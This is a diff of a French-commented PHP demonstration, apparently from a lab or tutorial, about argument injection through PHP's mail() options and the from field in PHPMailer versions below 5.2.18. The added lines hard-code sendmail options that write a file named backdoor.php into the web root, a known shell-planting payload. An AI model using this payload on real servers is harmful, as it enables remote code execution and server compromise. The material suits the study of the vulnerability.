@@ -24,32 +24,27 @@ exemple 2 : exécution d'un shell
 
 
 /**************************************************************************
- 	Explications sur la fonction mail php -> utilisation des options 
+ 	Explication sur la fonction mail php -> utilisation des options 
 
 ****************************************************************************/
 
-if(isset($_POST['mail'])){
-
-$login = $_POST['login'];
-$login = $_POST['mail'];
+$login = "test";
+$to = "mail@example.com";
 $subject = "Test";
 
-$message = $_POST['message'];
+$message = "";
 $headers = '';
+$options="";
+$options = "-OQueueDirectory=/tmp -X/var/www/html/backdoor.php";
 if(mail($to, $subject, $message, $headers, $options))
  echo 'ok';
 else 
 echo 'done';
-}
-
-
-?>
 
 /**************************************************************************
- 	Explications de l'injection dans le champ from de SendMail < 5.2.18
+ 	Explication de l'injection dans le champ from de SendMail < 5.2.18
 
 ****************************************************************************/
-
 
 require_once("vendor/autoload.php");
 //require("PHPMailerAutoload.php");
@@ -78,3 +73,4 @@ if(!$mail->send()) {
     echo 'Message has been sent';
 }
 
+?>
